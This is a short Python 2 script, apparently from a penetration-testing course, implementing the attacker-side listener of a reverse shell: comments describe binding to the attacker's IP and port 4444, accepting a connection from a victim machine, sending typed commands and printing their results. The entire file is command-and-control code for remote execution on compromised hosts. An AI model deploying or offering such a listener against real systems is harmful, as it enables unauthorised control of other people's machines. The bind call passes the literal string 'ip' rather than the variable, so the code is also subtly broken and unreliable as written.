#!/usr/bin/python

import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket

        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow the socket to be reused

        listener.bind(("ip", port)) # Bind the socket to the attacker's IP and port
        listener.listen(0) # Listen for incoming connections
        print("Waiting for incoming connections...") # Print a message to indicate that the listener is waiting for connections
        self.connection, address = listener.accept() # Accept an incoming connection
        print("Connection established! from " + str(address)) # Print a message to indicate that a connection has been established

    def execute_remotely(self, command):
        self.connection.send(command) # Send the command to the connected client
        return self.connection.recv(1024)
        # Receive the command result from the client


    def run(self):
        # This function runs the listener and waits for commands from the attacker
        while True:
            command = raw_input(">> ") # Prompt the user for a command
            result = self.execute_remotely(command)
            print(result) # Print the command result


my_listener = Listener("10.0.2.16", 4444) # Create a Listener object with the attacker's IP and port
my_listener.run() # Run the listener



